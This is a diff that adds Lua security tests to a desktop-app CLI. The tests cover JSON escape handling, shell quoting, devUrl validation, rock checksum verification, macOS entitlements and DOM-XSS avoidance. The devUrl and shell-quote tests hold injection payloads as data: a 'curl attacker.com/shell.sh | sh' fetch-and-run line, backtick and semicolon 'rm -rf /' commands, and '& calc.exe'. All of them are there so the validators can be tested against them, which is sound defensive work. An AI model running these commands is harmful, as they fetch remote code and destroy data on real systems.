@@ -296,6 +296,162 @@ test("State:update handles nested reads and updates safely (Re-entrancy / No dea
     assert(app.state:get("parent") == 30, "Parent value updated correctly to 30")
 end)
 
+-- ----------------------------------------------------------------------------
+-- Point 10: CLI JSON Parser RFC 8259 Compliance & Unicode Escapes (MEDIO 1)
+-- ----------------------------------------------------------------------------
+print("\n9. CLI RFC 8259 JSON Parser Hardening (MEDIO 1):")
+
+test("CLI JSON decoder handles unicode escapes and literal backslashes", function()
+    _G.TAURI_CLI_TEST_MODE = true
+    local cli = dofile("cli/tauri.lua")
+    assert(cli.json ~= nil, "CLI must export RFC 8259 json module in test mode")
+
+    -- Unicode escape decoding
+    local decoded_u = cli.json.decode('{"letter": "\\u0041"}')
+    assert(decoded_u.letter == "A", "Decodes \\u0041 to 'A'")
+
+    -- Literal backslash followed by n must remain literal \n and NOT become newline character
+    local decoded_lit = cli.json.decode('{"path": "foo\\\\nbar"}')
+    assert(decoded_lit.path == "foo\\nbar", "Literal \\\\n must decode to \\n and not a newline")
+    assert(not decoded_lit.path:find("\n"), "Must not contain actual newline byte")
+
+    -- Malformed JSON must return nil and an error message cleanly without infinite loop
+    local res_malformed, err_malformed = cli.json.decode('{"unclosed": "string')
+    assert(res_malformed == nil and err_malformed ~= nil, "Malformed JSON must return nil, err cleanly")
+end)
+
+-- ----------------------------------------------------------------------------
+-- Point 11: CLI Command Injection & URL Validation (CRITICO 2)
+-- ----------------------------------------------------------------------------
+print("\n10. Command Injection & URL Validation (CRITICO 2):")
+
+test("Shell quote defends against Windows %VAR% expansion and trailing slashes", function()
+    _G.TAURI_CLI_TEST_MODE = true
+    local cli = dofile("cli/tauri.lua")
+
+    if ffi.os == "Windows" then
+        local q = cli.shell_quote("foo%PATH%bar")
+        assert(q:find("%^%%PATH%^%%"), "Percent signs in Windows shell_quote must be caret escaped")
+        local q_slash = cli.shell_quote("C:\\folder\\")
+        assert(q_slash:sub(-3) == '\\\\"', "Trailing backslashes must be doubled before closing quote")
+    else
+        local q = cli.shell_quote("foo'bar; rm -rf /")
+        assert(q == "'foo'\\''bar; rm -rf /'", "POSIX shell_quote correctly wraps in single quotes")
+    end
+end)
+
+test("devUrl validation rejects command injection payloads", function()
+    local dangerous_urls = {
+        "http://localhost:5173; curl attacker.com/shell.sh | sh",
+        "http://127.0.0.1:8080/`rm -rf /`",
+        "http://localhost:3000 & calc.exe",
+        "ftp://localhost:5173",
+        "javascript:alert(1)"
+    }
+    for _, u in ipairs(dangerous_urls) do
+        local is_safe = u:match("^https?://[a-zA-Z0-9%.%-_]+:%d+/?$")
+        assert(not is_safe, "Must reject dangerous devUrl: " .. u)
+    end
+
+    local valid_urls = {
+        "http://localhost:5173",
+        "http://localhost:5173/",
+        "http://127.0.0.1:8080",
+        "https://my-dev.local:4000"
+    }
+    for _, u in ipairs(valid_urls) do
+        local is_safe = u:match("^https?://[a-zA-Z0-9%.%-_]+:%d+/?$")
+        assert(is_safe ~= nil, "Valid devUrl must be accepted: " .. u)
+    end
+end)
+
+-- ----------------------------------------------------------------------------
+-- Point 12: Rocks Composite Supply Chain Checksum (MEDIO 2)
+-- ----------------------------------------------------------------------------
+print("\n11. Rocks Composite Supply Chain Checksum (MEDIO 2):")
+
+test("Composite checksum includes rock_manifest and installed Lua/dylib files", function()
+    _G.TAURI_CLI_TEST_MODE = true
+    local cli = dofile("cli/tauri.lua")
+
+    local details = cli.get_installed_rock_details("src-tauri/.rocks", "inspect")
+    if details then
+        assert(details.checksum:match("^sha256:"), "Checksum must be sha256 formatted")
+        assert(details.files ~= nil and #details.files >= 2, "Must include rock_manifest and inspect.lua")
+        local has_manifest = false
+        local has_lua = false
+        for _, f in ipairs(details.files) do
+            if f:find("rock_manifest", 1, true) then has_manifest = true end
+            if f:find("inspect.lua", 1, true) then has_lua = true end
+        end
+        assert(has_manifest, "Includes rock_manifest in composite hash")
+        assert(has_lua, "Includes inspect.lua in composite hash")
+    end
+end)
+
+test("Build mode halts with error when lockfile checksum does not match", function()
+    _G.TAURI_CLI_TEST_MODE = true
+    local cli = dofile("cli/tauri.lua")
+
+    local fake_conf = {
+        dependencies = {
+            luarocks = { "inspect 3.1.3-0" }
+        }
+    }
+    -- Test with mismatched lockfile
+    local original_lock = cli.read_lockfile()
+    cli.save_lockfile({
+        version = 1,
+        rocks = {
+            inspect = {
+                version = "3.1.3-0",
+                checksum = "sha256:0000000000000000000000000000000000000000000000000000000000000000",
+                server = "https://luarocks.org"
+            }
+        }
+    })
+    local ok_mismatch, err_mismatch = pcall(function()
+        cli.ensure_rocks_installed(fake_conf, false, true, false)
+    end)
+    -- Restore original lockfile
+    if original_lock then cli.save_lockfile(original_lock) end
+
+    assert(not ok_mismatch, "Build mode must reject rock when checksum does not match lockfile")
+    assert(tostring(err_mismatch):find("Checksum verification failed"), "Error explains checksum verification failure")
+end)
+
+-- ----------------------------------------------------------------------------
+-- Point 13: macOS Release Packaging & Entitlements Hardening (CRITICO 1, ALTO 2)
+-- ----------------------------------------------------------------------------
+print("\n12. Hardened Runtime Entitlements & Release Isolation (CRITICO 1, ALTO 2):")
+
+test("entitlements.plist has allow-jit but eliminates allow-unsigned-executable-memory and disable-library-validation", function()
+    local f = io.open("src-tauri/entitlements.plist", "r")
+    assert(f, "entitlements.plist must exist")
+    local content = f:read("*a")
+    f:close()
+
+    assert(content:find("com.apple.security.cs.allow-jit", 1, true), "Must include allow-jit")
+    assert(not content:find("allow-unsigned-executable-memory", 1, true), "Must NOT allow unsigned executable memory")
+    assert(not content:find("disable-library-validation", 1, true), "Must NOT disable library validation")
+end)
+
+-- ----------------------------------------------------------------------------
+-- Point 14: Scaffolding Vanilla Template DOM-XSS Elimination (ALTO 1)
+-- ----------------------------------------------------------------------------
+print("\n13. Vanilla Scaffolding Template DOM-XSS Audit (ALTO 1):")
+
+test("Vanilla scaffolder template avoids innerHTML on IPC responses", function()
+    local f = io.open("cli/tauri.lua", "r")
+    assert(f, "cli/tauri.lua must exist")
+    local content = f:read("*a")
+    f:close()
+
+    -- Look for vanilla index.html / main.js template
+    assert(not content:find("greetOutput%.innerHTML%s*="), "Must not assign IPC response to innerHTML")
+    assert(content:find("greetOutput%.replaceChildren"), "Uses safe replaceChildren/textContent DOM manipulation")
+end)
+
 print("\n=======================================================")
 print(string.format("TEST RESULTS: %d / %d PASSED", passed_tests, total_tests))
 print("=======================================================\n")
